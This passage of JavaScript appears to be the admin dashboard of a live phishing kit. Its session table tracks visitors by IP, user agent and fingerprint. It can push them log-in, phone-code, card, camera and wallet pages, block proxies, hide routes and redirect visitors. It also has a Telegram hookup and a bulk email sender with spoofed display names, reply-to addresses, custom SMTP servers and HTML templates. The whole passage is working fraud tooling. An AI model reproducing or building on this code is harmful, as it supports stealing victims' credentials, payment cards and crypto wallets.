    state.activeTab = savedTab;
  }
  const sessionsTab = document.getElementById('sessionsTab');
  const emailTab = document.getElementById('emailTab');
  const miscTab = document.getElementById('miscTab');
  const emailFormDiv = document.getElementById('emailForm');
  const emailDisplayName = document.getElementById('emailDisplayName');
  const emailReplyTo = document.getElementById('emailReplyTo');
  const htmlTemplateFile = document.getElementById('htmlTemplateFile');
  const htmlFilePath = document.getElementById('htmlFilePath');
  const embedImageFile = document.getElementById('embedImageFile');
  const embedImagePath = document.getElementById('embedImagePath');
  const notificationsToggle = document.getElementById('notificationsToggle');
  const notificationsDropdown = document.getElementById('notificationsDropdown');
  const settingsToggle = document.getElementById('settingsToggle');
  const settingsDropdown = document.getElementById('settingsDropdown');
  const notificationIndicator = document.getElementById('notificationIndicator');
  const sessionsTable = document.getElementById('sessionsTable');
  const sessionManager = document.getElementById('sessionManager');
  if (sessionManager) {
    sessionManagerObserver.observe(sessionManager, { childList: true, subtree: true });
  }
  const closeSessionManager = document.getElementById('closeSessionManager');
  const terminateSessionBtn = document.getElementById('terminateSession');
  const sendToUser = document.getElementById('sendToUser');
  const sessionManagerTabs = document.querySelectorAll('[data-tab]');
  const tabContents = {
    pages: document.getElementById('pagesTabContent'),
    connection: document.getElementById('connectionTabContent'),
    activity: document.getElementById('activityTabContent'),
    workflow: document.getElementById('workflowTabContent'),
    fingerprint: document.getElementById('fingerprintTabContent')
  };
  const availablePagesContainer = document.getElementById('availablePages');
  const pagePreview = document.getElementById('pagePreview');
  let showAdmins = true;
  const presetSelect = document.getElementById("preset");
  let customPresets = JSON.parse(localStorage.getItem(PRESET_STORE.listKey) || '[]');
  const basePresets = ['dark', 'light'];
  const soundEffect = new Audio("https://audio.jukehost.co.uk/9Yk3JansL3ZNhPqj5VAY38EnLFUqvooT");
  const requiredInfoContainer = document.getElementById('requiredInfoContainer');
  const requiredInfoInput = document.getElementById('requiredInfoInput');
  let sendToUserButton;
  sendToUserButton = document.getElementById('sendToUser');
  const requiredInfoError = document.getElementById('requiredInfoError');
  const sessionIp = document.getElementById('sessionIp');
  const copyIp = document.getElementById('copyIp');
  const copyUserAgent = document.getElementById('copyUserAgent');
  const activityTimeline = document.getElementById('activityTimeline');
  const smtpDropdown = document.getElementById('emailSmtp');
  const emailSendForm = document.getElementById('emailSendForm')
  const queries = new Set();
  const ytQueryButton = document.getElementById('ytQueryButton')
  const soundEffectsPath = '/assets/soundeffects/';
  const audioCache = new Map();
  const ytQueryModal = document.getElementById('ytQueryModal')
  const ytQueryModalClose = document.getElementById('ytQueryModalClose')
  const ytQueryModalBackdrop = document.getElementById('ytQueryModalBackdrop')
  const ytQueryInput = document.getElementById('ytQueryInput')
  const ytQueryDisplay = document.getElementById('ytQueryDisplay')
  const ytQueryApplyBtn = document.getElementById('ytQueryApplyBtn')
  const emailRecipient = document.getElementById('emailRecipient');
  const emailSender = document.getElementById('emailSender');
  const emailSubject = document.getElementById('emailSubject');
  const emailTemplate = document.getElementById('emailTemplate');
  const previewRecipient = document.getElementById('previewRecipient');
  const previewSender = document.getElementById('previewSender');
  const previewSubject = document.getElementById('previewSubject');
  const toaster = document.getElementById('toaster');
  const collapsibleSections = document.querySelectorAll('.collapsible-section');

  const iconMap = {
    'log-in': '<path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" x2="3" y1="12" y2="12"/>',
    'smartphone': '<rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><line x1="12" x2="12" y1="18" y2="18"/>',
    'key': '<path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/>',
    'credit-card': '<rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/>',
    'camera': '<path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/>',
    'wallet': '<path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/><path d="M18 12a2 2 0 0 0 0 4h4v-4Z"/>',
    'activity': '<path d="M22 12h-4l-3 9L9 3l-3 9H2"/>',
    'mail': '<rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>',
    'file-question': '<path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/><polyline points="14 2 14 8 20 8"/><path d="M10 13a1 1 0 0 0 1 1h0a1 1 0 0 0 1-1V9.4a1 1 0 0 0-1-1h0a1 1 0 0 0-1 1"/><path d="M11 17h.01"/>',
    'eye': '<path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/>',
    'trash-2': '<path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/><line x1="10" x2="10" y1="11" y2="17"/><line x1="14" x2="14" y1="11" y2="17"/>',
    'check': '<path d="M20 6 9 17l-5-5"/>'
  };

  const soundEffectsCookie = getCookie("soundEffects");
  if (soundEffectsCookie !== null) {
    state.soundEffects = (soundEffectsCookie === 'true');
  }
  const notificationsCookie = getCookie("showNotifications");
  if (notificationsCookie !== null) {
    state.showNotifications = (notificationsCookie === 'true');
  }
  const blockproxyCookie = getCookie("block_proxy");
  if (blockproxyCookie !== null) {
    state.block_proxy = (blockproxyCookie === 'true');
  }
  const hiderouteToggleX = getCookie("hide_route");
  if (hiderouteToggleX !== null) {
    state.hide_route = (hiderouteToggleX === 'true');
  }
  
  updateUI();

  function updateUI() {
    if (state.activeTab === 'sessions') {
      sessionsTab.classList.add('active');
      emailTab.classList.remove('active');
      miscTab.classList.remove('active');
      document.getElementById('sessionsPanel').style.display = 'block';
      document.getElementById('miscForm').style.display = 'none';
      emailFormDiv.style.display = 'none';
      renderSessionsTable();
    } else if (state.activeTab === 'email') {
      sessionsTab.classList.remove('active');
      emailTab.classList.add('active');
      miscTab.classList.remove('active');
      document.getElementById('sessionsPanel').style.display = 'none';
      document.getElementById('miscForm').style.display = 'none';
      emailFormDiv.style.display = 'grid';
      updateEmailPreview();
    } else if (state.activeTab === 'misc') {
      sessionsTab.classList.remove('active');
      emailTab.classList.remove('active');
      miscTab.classList.add('active');
      document.getElementById('miscForm').style.display = 'grid';
      document.getElementById('sessionsPanel').style.display = 'none';
      emailFormDiv.style.display = 'none';
    }
    if (state.selectedSession && state.sessionManagerVisible) {
      renderActivityTimeline();
    }
  
    notificationIndicator.style.display = state.notifications.some(n => n.unread) ? 'block' : 'none';
  
    renderNotificationsDropdown();
    renderSettingsDropdown();
    renderAvailablePages();
    updateSessionManager();
    updateActiveSessionsMetric();
    updateTerminatedSessionsMetric();
    updateTotalSessionsMetric();
    loadNotifications();
    loadNotificationsFromCookie();
    loadLayout();
    loadSmtpServers();
    updateEmailPreview();
  }

  smtpDropdown.addEventListener('change', handleSmtpAction);
  
  async function handleSmtpAction(e) {
    const selectedValue = smtpDropdown.value;
    
    if (selectedValue === 'add-smtp') {
      if (document.getElementById('smtpModal').classList.contains('show')) {
        return;
      }
      
      const result = await showSmtpModal('Add SMTP Server', 'Save Configuration');
      
      if (!result) return;
      
      const smtpValue = `${result.host}:${result.username}:${result.password}:${result.port}`;
      const smtpLabel = `${result.host}:${result.username}:*** (port:${result.port})`;
      
      const newOption = document.createElement('option');
      newOption.value = smtpValue;
      newOption.textContent = smtpLabel;
      
      smtpDropdown.insertBefore(newOption, smtpDropdown.options[0]);
      smtpDropdown.value = smtpValue;
      
      showToast('SMTP Server added successfully', 'success');
    }
  }


  function renderPresetDropdown() {
    presetSelect.innerHTML = '';
    [...basePresets, ...customPresets].forEach(name => {
      const opt = document.createElement('option');
      opt.value = name;
      opt.textContent = name.charAt(0).toUpperCase() + name.slice(1);
      presetSelect.append(opt);
    });
  
    const createOpt = document.createElement('option');
    createOpt.value = 'create';
    createOpt.textContent = '+ Create Preset';
    presetSelect.append(createOpt);
  }
  
  presetSelect.addEventListener('change', async (e) => {
    const value = e.target.value;
  
    if (value === 'create') {
      const presetName = await showInputBoxModal('Enter a name for your new preset', 'Preset Name', 'Create');
      if (presetName) {
        const trimmedName = presetName.trim();
        if (trimmedName.length > 24) {
          showToast('Preset name cannot be longer than 24 characters', 'error');
          return;
        }
        if (!customPresets.includes(trimmedName)) {
          const currentColors = {};
          REQUIRED_COLORS.forEach(cssVar => {
            currentColors[cssVar] = getComputedStyle(document.documentElement).getPropertyValue(cssVar).trim();
          });
          
          customPresets.push(trimmedName);
          localStorage.setItem(PRESET_STORE.listKey, JSON.stringify(customPresets));
          localStorage.setItem(PRESET_STORE.overridesKey(trimmedName), JSON.stringify(currentColors));
          
          renderPresetDropdown();
          applyPreset(trimmedName);
          showToast(`Preset "${trimmedName}" created!`, 'success');
        } else {
          showToast('Preset name already exists', 'error');
        }
      }
    } else {
      applyPreset(value);
    }
  });
  
  function applyPreset(name) {
    document.documentElement.style.cssText = '';
    
    let baseColors = {};
    
    if (name === 'dark') {
      baseColors = {...darkPreset};
    } else if (name === 'light') {
      baseColors = {...lightPreset};
    } else {
      baseColors = {...darkPreset};
    }
    
    const storedOverrides = localStorage.getItem(PRESET_STORE.overridesKey(name));
    const overrides = storedOverrides ? JSON.parse(storedOverrides) : {};
    
    const finalColors = {...baseColors, ...overrides};
    
    let missingColors = false;
    REQUIRED_COLORS.forEach(color => {
      if (!finalColors[color]) {
        missingColors = true;
        finalColors[color] = baseColors[color] || '#ffffff';
      }
    });
    
    if (missingColors && !['dark', 'light'].includes(name)) {
      localStorage.setItem(PRESET_STORE.overridesKey(name), JSON.stringify(finalColors));
    }
    
    Object.entries(finalColors).forEach(([k, v]) => document.documentElement.style.setProperty(k, v));
    
    presetSelect.value = name;
    localStorage.setItem(PRESET_STORE.activeKey, name);
    syncColorInputs();
  }
  
  function syncColorInputs() {
    document.querySelectorAll('.color-input').forEach(input => {
      const cssVar = input.dataset.var;
      input.value = getComputedStyle(document.documentElement).getPropertyValue(cssVar).trim();
    });
  }
  
  document.querySelectorAll('.color-input').forEach(input => {
    input.addEventListener('input', () => {
      document.documentElement.style.setProperty(input.dataset.var, input.value);
    });
  });
  
  document.getElementById('deletePresetBtn').addEventListener('click', () => {
    const preset = presetSelect.value;
    if (preset === 'dark' || preset === 'light') {
      showToast('You cannot delete the Dark or Light preset', 'error');
      return;
    }
  
    customPresets = customPresets.filter(p => p !== preset);
    localStorage.setItem(PRESET_STORE.listKey, JSON.stringify(customPresets));
    localStorage.removeItem(PRESET_STORE.overridesKey(preset));
  
    let nextPreset = customPresets[customPresets.length - 1];
    if (!nextPreset) {
      nextPreset = 'dark';
    }
  
    localStorage.setItem(PRESET_STORE.activeKey, nextPreset);
    renderPresetDropdown(); 
    applyPreset(nextPreset); 
  
    showToast(`Preset "${preset}" deleted!`, 'success');
  });
  
const resetBtn = document.getElementById('resetBtn');
resetBtn.addEventListener('click', () => {
  const preset = presetSelect.value;
  let baseColors;
  if (preset === 'dark') {
    baseColors = {...darkPreset};
    showToast(`Resetting "${preset}" theme to default`, 'info');
  } else if (preset === 'light') {
    baseColors = {...lightPreset};
    showToast(`Resetting "${preset}" theme to default`, 'info');
  } else {
    baseColors = {...darkPreset};
    showToast(`Preset "${preset}" reset to default dark colors`, 'success');
  }
  Object.entries(baseColors).forEach(([cssVar, color]) => {
    document.documentElement.style.setProperty(cssVar, color);
  });
  localStorage.setItem(PRESET_STORE.overridesKey(preset), JSON.stringify(baseColors));
  syncColorInputs();
});

  
  themeForm.addEventListener('submit', e => {
    e.preventDefault();
    const preset = presetSelect.value;
    const overrides = {};
  
    document.querySelectorAll('.color-input').forEach(input => {
      overrides[input.dataset.var] = input.value;
    });
  
    REQUIRED_COLORS.forEach(color => {
      if (!overrides[color]) {
        overrides[color] = getComputedStyle(document.documentElement).getPropertyValue(color).trim();
      }
    });
  
    localStorage.setItem(PRESET_STORE.overridesKey(preset), JSON.stringify(overrides));
    showToast(`Theme saved for "${preset}"`, 'success');
  });
  
  document.getElementById('downloadJsonBtn').addEventListener('click', () => {
    const activePresetName = presetSelect.value;
    const activePresetData = getPresetData(activePresetName);
    const jsonData = JSON.stringify(activePresetData, null, 2);
    const blob = new Blob([jsonData], { type: 'application/json' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `${activePresetName}_theme.json`;
    link.click();
  });
  
  function getPresetData(presetName) {
    const colors = {};
    
    REQUIRED_COLORS.forEach(key => {
      colors[key] = getComputedStyle(document.documentElement).getPropertyValue(key).trim();
    });
    
    return { name: presetName, colors };
  }
  
  document.getElementById('uploadThemeBtn').addEventListener('click', () => {
    document.getElementById('fileInput').click();
  });
  
  document.getElementById('fileInput').addEventListener('change', event => {
    const file = event.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = function(e) {
        try {
          const themeData = JSON.parse(e.target.result);
  
          if (!themeData.colors || !themeData.name) {
            showToast('Uploaded theme is invalid! Missing "colors" or "name" field.', 'error');
            return;
          }
  
          const newPresetName = themeData.name;
          
          const completeColors = {...themeData.colors};
          let missingColors = false;
          
          REQUIRED_COLORS.forEach(color => {
            if (!completeColors[color]) {
              missingColors = true;
              completeColors[color] = darkPreset[color] || '#ffffff';
            }
          });
          
          if (missingColors) {
          }
  
          if (customPresets.includes(newPresetName)) {
            if (confirm(`Preset "${newPresetName}" already exists. Do you want to overwrite it?`)) {
              localStorage.setItem(PRESET_STORE.overridesKey(newPresetName), JSON.stringify(completeColors));
            } else {
              showToast('Upload cancelled', 'info');
              return;
            }
          } else {
            customPresets.push(newPresetName);
            localStorage.setItem(PRESET_STORE.listKey, JSON.stringify(customPresets));
            
            localStorage.setItem(PRESET_STORE.overridesKey(newPresetName), JSON.stringify(completeColors));
          }
  
          Object.entries(completeColors).forEach(([cssVar, colorValue]) => {
            document.documentElement.style.setProperty(cssVar, colorValue);
          });
  
          localStorage.setItem(PRESET_STORE.activeKey, newPresetName);
  
          renderPresetDropdown();
          presetSelect.value = newPresetName;
          syncColorInputs();
  
          showToast('Theme uploaded and applied successfully!', 'success');
        } catch (error) {
          logErrorToServer(error);
          showToast('Invalid JSON file!', 'error');
        }
      };
      reader.readAsText(file);
    }
  });
  
  function getCurrentThemeJson() {
    const themeJson = {};
    REQUIRED_COLORS.forEach(color => {
      themeJson[color] = getComputedStyle(document.documentElement).getPropertyValue(color).trim();
    });
    return JSON.stringify(themeJson, null, 2);
  }
  
  renderPresetDropdown();
  applyPreset(localStorage.getItem(PRESET_STORE.activeKey) || 'dark');

  function setActiveTab(tab) {
    state.activeTab = tab;
    localStorage.setItem('activeTab', tab);
    updateUI();
    if (tab === 'miscellaneous') {
      if (typeof loadVideos === 'function') {
        loadVideos();
      }
    }
  }

  function timeSince(timestamp) {
    if (!timestamp || timestamp === null || timestamp === undefined) {
      return "Unknown";
    }
    
    let timestampNum;
    
    if (typeof timestamp === 'string') {
      timestampNum = parseInt(timestamp, 10);
    } else {
      timestampNum = Math.floor(timestamp);
    }
    
    if (isNaN(timestampNum) || timestampNum <= 0) {
      return "Invalid";
    }
    
    if (timestampNum > 9999999999) {
      timestampNum = Math.floor(timestampNum / 1000);
    }
    
    const now = Math.floor(Date.now() / 1000);
    const diff = now - timestampNum;
    
    if (diff < 0) {
      return "Just now";
    }
    
    if (diff < 60) {
      return diff <= 1 ? "Just now" : `${diff} seconds ago`;
    }
    
    const minutes = Math.floor(diff / 60);
    if (minutes < 60) {
      return minutes === 1 ? "1 minute ago" : `${minutes} minutes ago`;
    }
    
    const hours = Math.floor(minutes / 60);
    if (hours < 24) {
      return hours === 1 ? "1 hour ago" : `${hours} hours ago`;
    }
    
    const days = Math.floor(hours / 24);
    return days === 1 ? "1 day ago" : `${days} days ago`;
  }

  function timeSince2(timestamp) {
    const diff = Math.floor((Date.now() - timestamp) / 1000);

    if (diff < 60) return diff === 1 ? "1 second ago" : (diff === 0 ? "Just now" : `${diff} seconds ago`);
  
    const minutes = Math.floor(diff / 60);
    if (minutes < 60) return minutes === 1 ? "1 minute ago" : `${minutes} minutes ago`;
  
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return hours === 1 ? "1 hour ago" : `${hours} hours ago`;
  
    const days = Math.floor(hours / 24);
    return days === 1 ? "1 day ago" : `${days} days ago`;
}
  

  let isDragging = false, startX, startY, initialLeft, initialTop;
const modal = document.getElementById('sessionManager');
const modalHeader = document.getElementById('modaldrag');
modal.style.position = 'absolute';
modalHeader.addEventListener('mousedown', function(e) {
  isDragging = true;
  startX = e.clientX;
  startY = e.clientY;
  initialLeft = parseInt(window.getComputedStyle(modal).left, 10) || 0;
  initialTop = parseInt(window.getComputedStyle(modal).top, 10) || 0;
  modalHeader.style.cursor = 'grabbing';
  document.addEventListener('mousemove', dragModal);
  document.addEventListener('mouseup', stopDragging);
});
function dragModal(e) {
  if (!isDragging) return;
  const deltaX = e.clientX - startX, deltaY = e.clientY - startY;
  modal.style.left = initialLeft + deltaX + 'px';
  modal.style.top = initialTop + deltaY + 'px';
}
function stopDragging() {
  if (!isDragging) return;
  isDragging = false;
  modalHeader.style.cursor = 'move';
  document.removeEventListener('mousemove', dragModal);
  document.removeEventListener('mouseup', stopDragging);
}
   

  function reqRender() {
    if (typeof socket !== 'undefined') {
        reqSes();
    }
    renderSessionsTable();
  }

  new Sortable(document.getElementById('miscGrid'), {
    animation: 150,
    swap: true,
    swapThreshold: 0.7,
    scroll: true,
    scrollSensitivity: 100,
    scrollSpeed: 20,
    fallbackOnBody: true,
    handle: '.lucide-grip',  
    onStart(evt) {
      document.querySelectorAll('#miscGrid').forEach(box => box.classList.add('scaled-down'));
    },
    onEnd(evt) {
      document.querySelectorAll('#miscGrid').forEach(box => box.classList.remove('scaled-down'));
      saveLayout();
    }
  });

  function saveLayout() {
    const container = document.getElementById('miscGrid');
    const order = Array.from(container.children).map(child =>
      child.getAttribute('data-box-id')
    );
    localStorage.setItem('miscLayout', JSON.stringify(order));
  }

  function loadLayout() {
    const savedOrder = localStorage.getItem('miscLayout');
    if (savedOrder) {
      const order = JSON.parse(savedOrder);
      const container = document.getElementById('miscGrid');
      order.forEach(id => {
        const box = container.querySelector(`[data-box-id="${id}"]`);
        if (box) {
          container.appendChild(box); 
        }
      });
    }
  }

  function reqSes() {
    if (socket.connected) {
        socket.emit('request_sessions'); 
    } else {
    }
  }

  function showDisconnectionAlert() {
    const overlayId = 'disconnectAlertOverlay';
    const alertId = 'disconnectAlert';
    const styleId = 'disconnect-alert-styles';
  
    if (document.getElementById(overlayId)) {
      return;
    }
    if (!document.getElementById(styleId)) {
      const styles = document.createElement('style');
      styles.id = styleId;
      styles.textContent = `
        #${overlayId} {
          position: fixed; top: 0; left: 0; right: 0; bottom: 0;
          background-color: rgba(86, 45, 58, 0.95); /* Match original */
          z-index: 9998; /* Slightly lower than original to be safe, adjust if needed */
          display: flex; justify-content: center; align-items: center;
        }
        #${alertId} {
          position: fixed; top: 50%; left: 50%;
          transform: translate(-50%, -50%);
          z-index: 9999; /* Slightly lower */
          text-align: center; color: white;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        #${alertId} .alert-icon { /* Target children via ID */
          width: 80px; height: 80px; margin: 0 auto 20px;
          border: 4px solid white; border-radius: 50%;
          display: flex; align-items: center; justify-content: center;
        }
        #${alertId} .alert-icon svg {
          width: 40px; height: 40px; fill: white;
        }
        #${alertId} .alert-title {
          font-size: 24px; font-weight: 600; margin-bottom: 15px;
        }
        #${alertId} .alert-error {
          display: inline-block; background-color: rgba(255, 255, 255, 0.1);
          padding: 8px 16px; border-radius: 20px; font-size: 14px; margin-bottom: 20px;
        }
        #${alertId} .alert-error span {
          background-color: #ff4444; padding: 2px 8px; border-radius: 12px;
          margin-right: 8px; font-size: 12px; font-weight: 600;
        }
        #${alertId} .alert-buttons {
          display: flex; gap: 10px; justify-content: center;
        }
        #${alertId} .alert-buttons button {
          padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer;
          font-weight: 500; font-size: 14px; transition: background-color 0.2s;
        }
        #${alertId} .alert-buttons .dismiss-btn { /* Use the specific class */
          background-color: rgba(255, 255, 255, 0.1); color: white;
        }
        #${alertId} .alert-buttons button:hover {
          opacity: 0.9;
        }
      `;
      document.head.appendChild(styles);
    }
  
    const overlayEl = document.createElement('div');
    overlayEl.id = overlayId; 
    document.body.appendChild(overlayEl);
  
    const alertEl = document.createElement('div');
    alertEl.id = alertId; 
    document.body.appendChild(alertEl);
  
    alertEl.innerHTML = `
      <div class="alert-icon">
        <svg viewBox="0 0 24 24">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 11c-.55 0-1-.45-1-1V8c0-.55.45-1 1-1s1 .45 1 1v4c0 .55-.45 1-1 1zm1 4h-2v-2h2v2z"/>
        </svg>
      </div>
      <div class="alert-title">Connection Lost</div>
      <div class="alert-error">
        <span>WARNING</span>
        Websocket disconnected. Real-time updates paused.
      </div>
      <div class="alert-buttons">
        <button class="dismiss-btn" id="disconnectAlertDismissBtnUnique">Dismiss</button>
      </div>
      `; 
  
    document.getElementById('disconnectAlertDismissBtnUnique').addEventListener('click', hideDisconnectionAlert);
  }
  
  function hideDisconnectionAlert() {
    const overlayId = 'disconnectAlertOverlay';
    const alertId = 'disconnectAlert';
  
    const overlayEl = document.getElementById(overlayId);
    const alertEl = document.getElementById(alertId);
  
    if (overlayEl) {
      overlayEl.remove();
    }
    if (alertEl) {
      const dismissBtn = alertEl.querySelector('#disconnectAlertDismissBtnUnique');
       if(dismissBtn) dismissBtn.removeEventListener('click', hideDisconnectionAlert);
      alertEl.remove();
    }
  }

  function updateWebsocketStatusIndicator(isConnected) {
    const statusElement = document.getElementById('websocket-status');
    if (!statusElement) {
      return;
    }

    const dotElement = statusElement.querySelector('.websocket-indicator-dot'); 
    const textElement = statusElement.querySelector('span:not(.blinking-dot)');


    if (dotElement && textElement) {
      if (isConnected) {
        dotElement.style.backgroundColor = '#22c55e';
        dotElement.classList.add('blinking-dot');
        textElement.textContent = 'Websocket connected';
      } else {
        dotElement.style.backgroundColor = '#ef4444'; 
        textElement.textContent = 'Websocket disconnected';
      }
    } else {
    }
  }

  function updateUIWithSettings(settings) {
    if (!state.config) state.config = {};
    if (!state.config.options) state.config.options = {};
    if (!state.config.options.api_keys) state.config.options.api_keys = {};
    state.showNotifications = settings.showNotifications === true;
    state.soundEffects = settings.soundEffects === true;
    state.block_proxy = settings.block_proxy === true;
    state.delete_inactive = settings.deleteInactiveSessions === 'true';
    state.hide_route = settings.hide_route === true;
    state.redirectURL = settings.redirectURL || '';
    state.mobile_only = settings.mobile_only === true;
    state.panel_status = settings.panel_status === true;
    state.inactiveSessionTimeoutMinutes = settings.inactiveSessionTimeoutMinutes || 30;
    state.workflow_mode = settings.workflow_mode === true;  
    state.page_title = settings.page_title || '';
    state.favicon_url = settings.favicon_url || '';
    const redirectInput = document.getElementById('redirectURL');
    if (redirectInput && settings && settings.redirectURL !== undefined) {
        redirectInput.value = settings.redirectURL;
    }
    const timeoutInput = document.getElementById('inactiveSessionTimeout');
    if (timeoutInput && settings && settings.inactiveSessionTimeoutMinutes !== undefined) {
        timeoutInput.value = settings.inactiveSessionTimeoutMinutes;
    }
    const workflowToggle = document.getElementById('workflow-mode-toggle');
    if (workflowToggle && settings && settings.workflow_mode !== undefined) {
        workflowToggle.checked = settings.workflow_mode;
    }
    const pageTitleInput = document.getElementById('pageTitle');
    if (pageTitleInput && settings && settings.page_title !== undefined) {
        pageTitleInput.value = settings.page_title;
    }
    const faviconUrlInput = document.getElementById('faviconUrl');
    if (faviconUrlInput && settings && settings.favicon_url !== undefined) {
        faviconUrlInput.value = settings.favicon_url;
    }

    socket.emit('get_telegram_config');

    const phoneButton = document.getElementById('phoneButton');
    if (phoneButton) {
        const svg = phoneButton.querySelector('svg');
        const indicator = document.getElementById('phoneButtonIndicator');
        if (svg && indicator) {
            if (state.mobile_only) {
                svg.innerHTML = '<rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12.667 8 10 12h4l-2.667 4"/>';
                svg.classList.add('lucide-smartphone-charging', 'lucide-smartphone-charging-icon');
                indicator.classList.remove('hidden');
            } else {
                svg.innerHTML = '<rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line>';
                svg.classList.remove('lucide-smartphone-charging', 'lucide-smartphone-charging-icon');
                indicator.classList.add('hidden');
            }
        } 
    }

    if (typeof renderSettingsDropdown === 'function') {
      try {
          renderSettingsDropdown();
      } catch (error) {
        logErrorToServer(error); 
      }
    } 
}
socket.on('telegram_config', (config) => {
    if (config.error) {
        return;
    }
    if (!state.config) state.config = {};
    if (!state.config.options) state.config.options = {};
    if (!state.config.options.api_keys) state.config.options.api_keys = {};
    state.config.options.api_keys.proxycheck = config.api_keys?.proxycheck || '';
    
    const proxyCheckInput = document.getElementById('proxyCheckApiKey');
    if (proxyCheckInput && config.api_keys?.proxycheck) {
        proxyCheckInput.value = config.api_keys.proxycheck;
    }
});

  function wsListener() {
    socket.off('connect');
    socket.off('disconnect');
    socket.off('sessions_response');
    socket.off('new_session');
    socket.off('update_session');
    socket.off('settings_updated');
    socket.off('notify_admins');
    socket.off('initial_settings');
    socket.off('initial_settings_error');
    socket.off('terminate_session_response');
    socket.off('route_updated');
    socket.off('routes_saved');
    socket.off('session_activity_updated');
    socket.on('connect', () => {
      updateWebsocketStatusIndicator(true);
      hideDisconnectionAlert();
      socket.emit('request_sessions'); 
      socket.emit('request_initial_settings'); 
      socket.emit('admin_join'); 
    });

    socket.on('disconnect', () => {
      updateWebsocketStatusIndicator(false);
      showDisconnectionAlert();
    });
    socket.on('sessions_response', (sessions) => {
        if (Array.isArray(sessions)) {
            renderSessionsTable();
            updateSessionMetrics();
            updateActivityLog();
        }
    });

    socket.on('new_session', (data) => {
        renderSessionsTable();
        updateSessionMetrics();
        if (data.session_id) {
            newSession(data);
        }
    });

    socket.on('update_session', (data) => {
        renderSessionsTable();
        updateSessionMetrics();
        if (data.session_id) {
            updateSessionManager();
        }
    });
    socket.on('settings_updated', (settings) => {
        updateUIWithSettings(settings);
        showToast('Settings were updated', 'info');
    });

    socket.on('notify_admins', (data) => {
        showToast(data.text, data.type);
    });

    socket.on('connect', () => {
      hideDisconnectionAlert();
      updateWebsocketStatusIndicator(true); 
      socket.emit('request_initial_settings');
      reqSes();
    });

    socket.on('disconnect', () => {
      showDisconnectionAlert();
      updateWebsocketStatusIndicator(false);
    });

    socket.on('initial_settings', (settings) => {
      updateUIWithSettings(settings);
    });

    socket.on('initial_settings_error', (error) => {
        logErrorToServer(error);
      showToast('Error loading settings', 'error');
    });

    socket.on('sessions_response', sessions => {
      if (sessions && Array.isArray(sessions)) {
          const validSessions = sessions.filter(session => {
            if (session.countryCode === null || typeof session.countryCode === 'undefined') {
              socket.emit('terminate_session', { session_id: session.id });
              return false;
            }
            return true;
          });

          state.sessions = validSessions;

        if (state.selectedSession) {
            const updatedSession = validSessions.find(s => s.id === state.selectedSession.id);
          if (updatedSession) {
            state.selectedSession = updatedSession;
            silentlyUpdateInputValues(updatedSession);
            } else {
                state.selectedSession = null;
                closeSessionManagerModal();
          }
        }
          renderSessionsTable();
      }
      hideTableLoader();
    });

    socket.on('new_session', (data) => {
          if (data.countryCode === null || typeof data.countryCode === 'undefined') {
              socket.emit('terminate_session', { session_id: data.id });
          } else {
              const existingIndex = state.sessions.findIndex(s => s.id === data.id);
              if (existingIndex > -1) {
                  state.sessions[existingIndex] = { ...state.sessions[existingIndex], ...data };
                  if (state.selectedSession && state.selectedSession.id === data.id) {
                       state.selectedSession = state.sessions[existingIndex];
                       silentlyUpdateInputValues(state.selectedSession);
                       updateSessionManager();
                  }
                  updateUI();
              } else {
          newSession(data);
              }
          }
      });

      socket.on('update_session', (data) => {
          const sessionIndex = state.sessions.findIndex(s => s.id === data.id);
          if (sessionIndex > -1) {
              if ('countryCode' in data && (data.countryCode === null || typeof data.countryCode === 'undefined')) {
                  socket.emit('terminate_session', { session_id: data.id });
                  state.sessions.splice(sessionIndex, 1);
                  if (state.selectedSession && state.selectedSession.id === data.id) {
                      state.selectedSession = null;
                      closeSessionManagerModal();
                  }
              } else {
                  state.sessions[sessionIndex] = { ...state.sessions[sessionIndex], ...data };
                   if (state.selectedSession && state.selectedSession.id === data.id) {
                       state.selectedSession = state.sessions[sessionIndex];
                       silentlyUpdateInputValues(state.selectedSession);
                       updateSessionManager();
                  }
              }
              updateUI();
          } else {
            if (!(data.countryCode === null || typeof data.countryCode === 'undefined')) {
                newSession(data);
            }
          }
      });

      let renderTableTimeout = null;
      socket.off('session_activity_updated'); 
      socket.on('session_activity_updated', (data) => {
        if (data && data.session_id) {
            const sessionIndex = state.sessions.findIndex(s => s.id === data.session_id);
            if (sessionIndex > -1) {
                state.sessions[sessionIndex].last_activity = data.last_activity;
                state.sessions[sessionIndex].isActive = data.isActive;
                if (data.current_page) {
                    state.sessions[sessionIndex].current_page = data.current_page;
                }  
                if (renderTableTimeout) {
                    clearTimeout(renderTableTimeout);
                }
                renderTableTimeout = setTimeout(() => {
              
                    renderSessionsTable(); 
                    updateSessionMetrics(); 
